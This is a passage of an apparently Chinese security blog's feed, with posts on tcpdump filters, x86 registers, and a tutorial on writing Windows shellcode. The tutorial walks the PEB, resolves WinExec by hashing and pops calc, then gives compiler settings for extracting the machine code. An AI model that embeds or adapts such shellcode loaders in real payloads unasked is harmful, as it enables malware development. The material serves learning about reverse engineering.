    <content type="html"><![CDATA[<h1 id="抓包原理"><a href="#抓包原理" class="headerlink" title="抓包原理"></a>抓包原理</h1><p>当网卡接收到一个网络报文后，会去遍历系统中所有已经注册了的网络协议，来尝试报文处理。</p><p>抓包模块会将自己伪装成一个网络协议，系统在遍历的时候就会发给抓包模块一份，抓包趁机将报文复制一份</p><h2 id="tcpdump用法"><a href="#tcpdump用法" class="headerlink" title="tcpdump用法"></a>tcpdump用法</h2><p>注意，需要root权限</p><p>使用<code> -w  a .pcap</code> 保存到数据包</p><ol><li>tcpdump</li></ol><blockquote><p>抓取所有经过第一网络接口的数据包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142257905.png" alt="image-20220402142257905"></p><ol start="2"><li>tcpdump -i lo0</li></ol><blockquote><p>抓取某个网卡的数据 lo0是我本地网卡，用ifconfig可以查看</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142304854.png" alt="image-20220402142304854"></p><ol start="3"><li>tcpdump -i en0 host 110.242.68.3</li></ol><blockquote><p>抓取经过en0 其目标地址或者源地址是110.242.68.3的数据包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142319281.png" alt="image-20220402142319281"></p><ol start="4"><li>tcpdump -i bridge100 host 192.168.150.1 and 192.168.150.14</li></ol><blockquote><p>抓取经过bridge100的主机192.168.150.1 与主机192.168.150.14间的流量包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142326636.png" alt="image-20220402142326636"></p><ol start="5"><li>tcpdump -i bridge100 -n  host 192.168.150.1 and ! 192.168.150.14</li></ol><blockquote><p>抓取经过bridge100的主机192.168.150.1 与除了主机192.168.150.14的所有流量包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142332919.png" alt="image-20220402142332919"></p><ol start="6"><li>tcpdump src host 192.168.150.14</li></ol><blockquote><p>抓取主机192.168.150.14 发送的所有数据</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142338294.png" alt="image-20220402142338294"></p><ol start="7"><li>tcpdump dst host 192.168.150.14</li></ol><blockquote><p>抓取所有流向192.168.150.14的数据</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142345128.png" alt="image-20220402142345128"></p><ol start="8"><li>tcpdump host 192.168.150.14 and tcp port 80</li></ol><blockquote><p>抓取主机192.168.150.14所有在TCP 80端口的数据包：</p></blockquote><ol start="9"><li>tcpdump host 192.168.150.14 and dst port 80</li></ol><blockquote><p>抓取主机192.168.150.14所有在http 80端口的数据包：</p></blockquote><ol start="10"><li>tcpdump port 80</li></ol><blockquote><p>抓取80端口获取或者发送的数据，可以用dst和src来来区分</p></blockquote><ol start="11"><li>tcpdump net 192.168</li></ol><blockquote><p>抓取网络192.168的数据，可以用dst和src来来区分</p></blockquote><ol start="12"><li>tcpdump 协议名</li></ol><blockquote><p>过滤协议</p></blockquote><ol start="13"><li>tcpdump ‘((tcp) and (port 80) and ((dst host 192.168.150.1) or (dst host 192.168.150.14)))’</li></ol><blockquote><p>目标是主机（192.168.150.1 或者192.168.150.14） 的 80端口的tcp的数据，注意理解其用法</p></blockquote><ol start="14"><li>tcpdump ‘tcp[tcpflags] &#x3D; tcp-syn’</li></ol><blockquote><p>只抓syn包，如果要抓syn和ACK包 去掉等号及其后面</p></blockquote><ol start="15"><li>tcpdump ‘((port 25) and (tap[(tcp[12]&gt;&gt;2):4] &#x3D; 0x4d41494c))’</li></ol><blockquote><p>抓取数据区开头为MAIL的包，MAIL的十六进制为 0x4d41494c</p></blockquote><ol start="16"><li>tcpdump ‘tcp[(tcp[12] &gt;&gt; 2):4 &#x3D; 0x47455420]’</li></ol><blockquote><p>抓取get包，get的十六进制0x47455420，post同理</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows ShellCode提取加载与免杀</title>
    <link href="/article/570c6a7.html"/>
    <url>/article/570c6a7.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章仅讲windows下的，linux下比较简单，之后可能会写</p><p>shellcode是一段用于利用软件漏洞而执行的代码</p><h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><p>首先说明，shellcode编写可以用c也可以直接用汇编来写，但难度不在一个层级，我们选择c》</p><p>vs我用的是vs2013，本来用的2008，但是找不到汇编窗口</p><p>下面是windows shellcode编写的步骤</p><blockquote><p>获取kernel32.dll 基地址； </p><p>定位 GetProcAddress函数的地址； </p><p>使用GetProcAddress确定 LoadLibrary函数的地址； </p><p>然后使用 LoadLibrary加载DLL文件（例如user32.dll）； </p><p>使用 GetProcAddress查找某个函数的地址（例如MessageBox）； </p><p>指定函数参数； </p><p>调用函数。</p></blockquote><p>首先要注意shellcode的<code>地址无关</code>原则</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">char</span>* arr = <span class="hljs-string">&quot;test&quot;</span>;</code></pre></div><p>我们看到这么写的话 test存放在一个固定地址，而不同windows下的内存地址是不同的，所以我们不能将地址写死</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141753290.png" alt="image-20220402141753290"></p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">char</span> cmd[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;</code></pre></div><p>但上面这种写法就不会有固定地址，但这样写需要用<code>\x00</code>来截断</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141804620.png" alt="image-20220402141804620"></p><p>现在地址无关解决，下一步是函数调用，我们需要kernel32.dll 基地址，但是由于ASLR导致dll可以加载到不同的内存位置，需要动态定位</p><p>PEB结构位于固定内存位置，所以我们可以通过PEB来获取。</p><blockquote><p>读取PEB结构 </p><p>跳转到0xC偏移处读取Ldr指针 </p><p>跳转到0x14偏移处读取 InMemoryOrderModuleList字段</p></blockquote><p>如果你不太懂上面三步，尽量多思考一下下面的内容</p><blockquote><p>进程：是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，可以简单的理解为，计算机中每运行的一个软件都是一个进程。</p><p>PEB：是一个位于所有进程内存中固定位置的结构体。此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。</p></blockquote><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB</span> &#123;  BYTE                          Reserved1[<span class="hljs-number">2</span>];  BYTE                          BeingDebugged;  BYTE                          Reserved2[<span class="hljs-number">1</span>];  PVOID                         Reserved3[<span class="hljs-number">2</span>];  PPEB_LDR_DATA                 Ldr;  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  BYTE                          Reserved4[<span class="hljs-number">104</span>];  PVOID                         Reserved5[<span class="hljs-number">52</span>];  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  BYTE                          Reserved6[<span class="hljs-number">128</span>];  PVOID                         Reserved7[<span class="hljs-number">1</span>];  ULONG                         SessionId;&#125; PEB, *PPEB;</code></pre></div><p>上面是微软关于PEB结构体的官方文档，</p><blockquote><p>上面内容的一些概念</p><p>BYTE表示1个字节</p><p>PVOID表示1个指针（或1个内存地址，ps：一定要弄明白指针这东西，很重要）在0x86中一个地址占四个字节</p><p>PPEB_LDR_DATA是1个指针，指向自定义结构体PEB_LDR_DATAPEB_LDR_DATA</p><p>BeingDebugged标志是1个字节</p><p>Reserved1[2]是两个BYTE的数组，占两个字节</p><p>Reserved3[2]是两个PVOID指针的数组，占八个字节</p></blockquote><p>我们重点关注下PEB_LDR_DATA（跳转到0xC偏移处读取Ldr指针 ）</p><p>跳转偏移计算：2 + 1 + 1 + 8 &#x3D; 12 &#x3D; 0xC</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB_LDR_DATA</span> &#123;  BYTE       Reserved1[<span class="hljs-number">8</span>];  PVOID      Reserved2[<span class="hljs-number">3</span>];  LIST_ENTRY InMemoryOrderModuleList;&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre></div><p>关注LIST_ENTRY InMemoryOrderModuleList（跳转到0x14偏移处读取 InMemoryOrderModuleList字段）</p><p>跳转偏移计算：8 + 12 &#x3D; 20 &#x3D; 0x14</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span> &#123;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span>  *Flink;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span>  *Blink;&#125; LIST_ENTRY, *PLIST_ENTRY;</code></pre></div><p>LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink）</p><p>InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段。但是它不是指向</p><p>LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。</p><p>上面操作完到了内存首个<code>模块</code>的InMemoryOrderLinks元素，这个<code>模块</code>是一个可执行文件（.exe），我们需要去遍历加载到内存的dll文件。</p><p>具体通过InMemoryOrderModuleList.Flink来访问第二个已加载的模块，通过循环操作就可以遍历所有已加载的模块</p><blockquote><p>calc.exe </p><p>ntdll.dll </p><p>kernel32.dll </p></blockquote><p>当我们通过遍历得到kernel32.dll后就可以完成下面操作了</p><blockquote><p>获取kernel32.dll 基地址； </p><p>定位 GetProcAddress函数的地址； </p><p>使用GetProcAddress确定 LoadLibrary函数的地址； </p><p>然后使用 LoadLibrary加载DLL文件（例如user32.dll）； </p><p>使用 GetProcAddress查找某个函数的地址（例如MessageBox）； </p><p>指定函数参数； </p><p>调用函数。</p></blockquote><p>这边有个代码模版，如果你实在不会写可以参考这个模版来理解上述操作</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;winnt.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;winternl.h&gt;</span></span><span class="hljs-function">DWORD <span class="hljs-title">getHash</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span> </span>&#123;DWORD h = <span class="hljs-number">0</span>;<span class="hljs-keyword">while</span> (*str) &#123;h = (h &gt;&gt; <span class="hljs-number">13</span>) | (h &lt;&lt; (<span class="hljs-number">32</span> - <span class="hljs-number">13</span>));h += *str &gt;= <span class="hljs-string">&#x27;a&#x27;</span> ? *str - <span class="hljs-number">32</span> : *str;str++;&#125;<span class="hljs-keyword">return</span> h;&#125;<span class="hljs-function">DWORD <span class="hljs-title">getunicodeHash</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* str)</span> </span>&#123;DWORD h = <span class="hljs-number">0</span>;PWORD ptr = (PWORD)str;<span class="hljs-keyword">while</span> (*ptr) &#123;h = (h &gt;&gt; <span class="hljs-number">13</span>) | (h &lt;&lt; (<span class="hljs-number">32</span> - <span class="hljs-number">13</span>));h += (BYTE)(*ptr) &gt;= <span class="hljs-string">&#x27;a&#x27;</span> ? (BYTE)(*ptr) - <span class="hljs-number">32</span> : (BYTE)(*ptr);ptr++;&#125;<span class="hljs-keyword">return</span> h;&#125;<span class="hljs-function">PVOID <span class="hljs-title">getWinExec</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-type">char</span> dllname[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span> &#125;;<span class="hljs-type">char</span> api[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span> &#125;;_PEB* peb = <span class="hljs-built_in">NtCurrentTeb</span>()-&gt;ProcessEnvironmentBlock;LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;LIST_ENTRY* ptr = first;<span class="hljs-keyword">do</span> &#123;LDR_DATA_TABLE_ENTRY* dte = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - <span class="hljs-number">0x8</span>);BYTE* baseAddress = (BYTE*)dte-&gt;DllBase;ptr = ptr-&gt;Flink;<span class="hljs-keyword">if</span> (!baseAddress)<span class="hljs-keyword">continue</span>;PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader-&gt;e_lfanew);DWORD iedRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<span class="hljs-keyword">if</span> (!iedRVA)<span class="hljs-keyword">continue</span>;PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + iedRVA);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getunicodeHash</span>(((<span class="hljs-keyword">decltype</span>(dte-&gt;FullDllName)*)(DWORD*)&amp;(dte-&gt;Reserved4))-&gt;Buffer) == <span class="hljs-built_in">getHash</span>(dllname)) &#123;DWORD* nameRVAs = (DWORD*)(baseAddress + ied-&gt;AddressOfNames);<span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; ied-&gt;NumberOfNames; i++) &#123;<span class="hljs-type">char</span>* funcName = (<span class="hljs-type">char</span>*)(baseAddress + nameRVAs[i]);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getHash</span>(funcName) == <span class="hljs-built_in">getHash</span>(api)) &#123;WORD ordinal = ((WORD*)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];DWORD functionRVA = ((DWORD*)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];<span class="hljs-keyword">return</span> baseAddress + functionRVA;&#125;&#125;&#125;&#125; <span class="hljs-keyword">while</span> (ptr != first);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-type">char</span> exec[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;<span class="hljs-keyword">decltype</span>(WinExec)* myWinExec = (<span class="hljs-keyword">decltype</span>(WinExec)*)<span class="hljs-built_in">getWinExec</span>();<span class="hljs-built_in">myWinExec</span>(exec, <span class="hljs-number">0</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">func</span>();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>上面代码执行完之后会弹出windows计算器</p><blockquote><p>这里不讲windows可利用shellcode的编写，cs，msf都已经提供了很好用的shellcode</p></blockquote><h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>shellcode的提取</p><blockquote><p>使用c++开发代码</p><p>更改VisualStudio编译配置</p><p>生成exe</p><p>在IDA下打开生成的exe，获得机器码</p></blockquote><p>开发代码我们已经完成了，接下来是编译</p><p>配置编译选项，下面很多是默认的</p><blockquote><p>release在调试工具栏</p></blockquote><p>使大小最小化</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 最大优化（优选大小）</p></blockquote><p>内联函数扩展</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 函数扩展(只适用于_inline(Ob1))</p></blockquote><p>启用内部函数</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 启用函数选择（是）</p></blockquote><p>禁用安全检查(&#x2F;Gs-)</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 代码生成 - 安全检查（禁用）</p></blockquote><p>启用函数级链接</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 代码生成 - 启用函数级链接(是)</p></blockquote><p>增量链接</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 -  常规 -启用增量链接 （否）</p></blockquote><p>生成映射文件</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 调试 - 生成映射文件 （是）</p><p>映射文件名随便写</p></blockquote><p>启用COMDAT折叠</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 优化 - 启用COMDAT折叠（是）</p></blockquote><p>函数顺序</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 优化 - 函数顺序 （function_order.txt）</p></blockquote><p>关闭SDL检查 </p><blockquote><p>项目 - (你项目名称的)属性 - c&#x2F;c++ - SDL检查改为否</p></blockquote><p>生成exe文件，用ida打开</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>intel x86寄存器及其汇编指令</title>
    <link href="/article/ec08c5f4.html"/>
    <url>/article/ec08c5f4.html</url>
    
    <content type="html"><![CDATA[<p>intel x86架构，复杂指令集，intel公司最成功的cpu架构。</p><p>x86代表32位架构</p><blockquote><p>我们平时装计算机所说的64位，32位代表寻址能力不同，一些地方说是支持的内存，其本质还是寻址能力</p><p>32位最大寻址内存范围是2的32次方，即4GB</p><div class="code-wrapper"><pre><code class="hljs 1k">1B=1024K=2^10K1GB=1024B=2^10B∴4GB=2^2*2^10*2^10*2^10=2^(2+10+10+10)=2^32```</code></pre></div><p>64位的最大寻址能力是2的64次方，即16384GB</p><p>但是，实际上限于种种原因，目前Windows 7 64位版仅能使用最大为192GB内存。</p><p>intel 系列向下兼容</p></blockquote><p>具体发展历史和一些细节：<a href="https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin">https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin</a></p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>八个通用寄存器：EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI</p><p>一个标志寄存器：EFLAGS</p><p>五个控制寄存器：分别为CR0-CR4</p><p>八个调试寄存器：分别为DR0-DR7</p><p>四个系统地址寄存器：GDTR、IDTR、LDTR和TR</p><p>其他寄存器：EIP、TSC等</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>八个通用寄存器大多时候可以通用，但是某些寄存器有隐含用法。</p><h4 id="EAX"><a href="#EAX" class="headerlink" title="EAX"></a>EAX</h4><p>累加器，很多加法乘法指令的缺省寄存器。</p><h4 id="EBX"><a href="#EBX" class="headerlink" title="EBX"></a>EBX</h4><p>基地址(base)寄存器, 在内存寻址时存放基地址。</p><h4 id="ECX"><a href="#ECX" class="headerlink" title="ECX"></a>ECX</h4><p>是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。 </p><h4 id="EDX"><a href="#EDX" class="headerlink" title="EDX"></a>EDX</h4><p>总是被用来放整数除法产生的余数。</p><h4 id="ESI-x2F-EDI"><a href="#ESI-x2F-EDI" class="headerlink" title="ESI&#x2F;EDI"></a>ESI&#x2F;EDI</h4><p>分别叫做”源&#x2F;目标索引寄存器(source&#x2F;destination index)，因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目的串. </p><blockquote><p>源串和目的串（也有的叫目标串）：</p><p>如在strcpy(*d, *s);</p><p>这里s指向的字符串就是源字符串，d指向的为<em>目的</em>字符串</p></blockquote><h4 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h4><p>是基址指针(BASE POINTER)，它最经常被用作高级语言函数调用的”框架指针”(frame pointer)</p><h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p>专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</p><blockquote><p>一般esp到ebp这段空间就是当前栈</p></blockquote><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141032834.png" alt="image-20220402141032834"></p><p>包含一组状态标志，系统标志以及一个控制标志</p><h4 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h4><p>若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。</p><h4 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h4><p>如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。</p><h4 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h4><p>如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。</p><h4 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h4><p>若结果为0则将其置1，反之清零。 </p><h4 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h4><p>该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负) </p><h4 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h4><p>如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。</p><h4 id="DF"><a href="#DF" class="headerlink" title="DF"></a>DF</h4><p>控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。</p><h4 id="TF"><a href="#TF" class="headerlink" title="TF"></a>TF</h4><p>将该位设置为1以允许单步调试模式，清零则禁用该模式。</p><h4 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h4><p>该标志用于控制处理器对可屏蔽中断请求的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。 </p><h4 id="IOPL"><a href="#IOPL" class="headerlink" title="IOPL"></a>IOPL</h4><p>指示当前运行任务的I&#x2F;O特权级，正在运行任务的当前特权级(CPL)必须小于或等于I&#x2F;O特权级才能允许访问I&#x2F;O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。</p><h4 id="NT"><a href="#NT" class="headerlink" title="NT"></a>NT</h4><p>这个标志控制中断链和被调用任务。若当前任务与前一个执行任务相关则置1，反之则清零。 </p><h4 id="RF"><a href="#RF" class="headerlink" title="RF"></a>RF</h4><p>控制处理器对调试异常的响应。</p><h4 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h4><p>置1以允许虚拟8086模式，清除则返回保护模式。</p><h4 id="AC"><a href="#AC" class="headerlink" title="AC"></a>AC</h4><p>标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。</p><h4 id="VIF"><a href="#VIF" class="headerlink" title="VIF"></a>VIF</h4><p>该标志是IF标志的虚拟镜像，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展</p><h4 id="VIP"><a href="#VIP" class="headerlink" title="VIP"></a>VIP</h4><p>该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零，与VIF标志结合使用。 </p><h4 id="ID"><a href="#ID" class="headerlink" title="ID"></a>ID</h4><p> 程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><h4 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h4><p>PE：CR0的位0是启用保护标志。当设置该位时即开启了保护模式；当复位时即进入实地址模式。这个标志仅开启段级保护，而并没有启用 分页机制。若要启用 分页机制，那么PE和PG标志都要置位。</p><blockquote><p>分页机制：<a href="https://baike.baidu.com/item/%E5%88%86%E9%A1%B5">https://baike.baidu.com/item/分页</a></p></blockquote><p>PG：CR0的位31是分页标志。当设置该位时即开启了分页机制；当复位时则禁止分页机制，此时所有线性地址等同于 物理地址。在开启这个标志之前必须已经或者同时开启PE标志。即若要启用分页机制，那么PE和PG标志都要置位。</p><p>WP：对于Intel 80486或以上的CPU，CR0的位16是 写保护（Write Proctect）标志。当设置该标志时，处理器会禁止 超级用户程序（例如 特权级0的程序）向用户级只读页面执行写操作；当该位复位时则反之。该标志有利于UNIX类操作系统在创建进程时实现写时复制（Copy on Write）技术。<br>NE：对于Intel 80486或以上的CPU，CR0的位5是 协处理器错误（Numeric Error）标志。当设置该标志时，就启用了x87 协处理器错误的内部报告机制；若复位该标志，那么就使用PC形式的x87协处理器 错误报告机制。当NE为复位状态并且CPU的IGNNE输入引脚有信号时，那么数学协处理器x87错误将被忽略。当NE为复位状态并且CPU的IGNNE输入引脚无信号时，那么非屏蔽的数学协处理器x87错误将导致处理器通过FERR引脚在外部产生一个中断，并且在执行下一个等待形式浮点指令或WAIT&#x2F;FWAIT指令之前立刻停止指令执行。CPU的FERR引脚用于仿真外部 协处理器80387的ERROR引脚，因此通常连接到中断控制器输入请求引脚上。NE标志、IGNNE引脚和FERR引脚用于利用外部逻辑来实现PC形式的外部 错误报告机制。</p><blockquote><p>启用保护模式PE（Protected Enable）位（位0）和开启 分页PG（Paging）位（位31）分别用于控制分段和分页机制。PE用于控制分段机制。如果PE&#x3D;1，处理器就工作在开启分段机制环境下，即运行在保护模式下。如果PE&#x3D;0，则处理器关闭了分段机制，并如同8086工作于实地址模式下。PG用于控制 分页机制。如果PG&#x3D;1，则开启了 分页机制。如果PG&#x3D;0， 分页机制被禁止，此时 线性地址被直接作为 物理地址使用。</p><p>如果PE&#x3D;0、PG&#x3D;0，处理器工作在实地址模式下；如果PG&#x3D;0、PE&#x3D;1，处理器工作在没有开启 分页机制的保护模式下；如果PG&#x3D;1、PE&#x3D;0，此时由于不在保护模式下不能启用分页机制，因此处理器会产生一个一般保护异常，即这种标志组合无效；如果PG&#x3D;1、PE&#x3D;1，则处理器工作在开启了分页机制的保护模式下。</p><p>当改变PE和PG位时，必须小心。只有当执行程序至少有部分代码和数据在线性地址空间和物理地址空间中具有相同地址时，我们才能改变PG位的设置。此时这部分具有相同地址的代码在 分页和未分页世界之间起着桥梁的作用。无论是否开启分页机制，这部分代码都具有相同的地址。另外，在开启分页（PG&#x3D;1）之前必须先刷新页高速缓冲TLB。<br>在修改该了PE位之后程序必须立刻使用一条跳转指令，以刷新处理器执行管道中已经获取的不同模式下的任何指令。在设置PE位之前，程序必须初始化几个系统段和控制寄存器。在系统刚上电时，处理器被复位成PE&#x3D;0和PG&#x3D;0（即实模式状态），以允许引导代码在启用分段和分页机制之前能够初始化这些寄存器和数据结构。</p></blockquote><h4 id="CR2和CR3"><a href="#CR2和CR3" class="headerlink" title="CR2和CR3"></a>CR2和CR3</h4><p>CR2和CR3用于分页机制。CR3含有存放页目录表页面的物理地址，因此CR3也被称为PDBR。因为页目录表页面是页对齐的，所以该寄存器只有高20位是有效的。而低12位保留供更高级处理器使用，因此在往CR3中加载一个新值时低12位必须设置为0。</p><h3 id="调试寄存器"><a href="#调试寄存器" class="headerlink" title="调试寄存器"></a>调试寄存器</h3><h4 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h4><p>全局描述符表寄存器，用于存放全局描述符表GDT的32位的线性基地址和16位的表限长值。基地址指定GDT表中字节0在线性地址空间中的地址，表长度指明GDT表的字节长度值。指令LGDT和SGDT分别用于加载和保存GDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。在保护模式初始化过程中必须给GDTR加载一个新值。</p><h4 id="IDTR"><a href="#IDTR" class="headerlink" title="IDTR"></a>IDTR</h4><p>中断描述符表寄存器，与GDTR的作用类似，IDTR寄存器用于存放中断描述符表IDT的32位线性基地址和16位表长度值。指令LIDT和SIDT分别用于加载和保存IDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。</p><h4 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h4><p>用于存放局部描述符表LDT的32位线性基地址、16位段限长和描述符属性值。指令LLDT和SLDT分别用于加载和保存LDTR寄存器的段描述符部分，包含LDT</p><h3 id="EIP"><a href="#EIP" 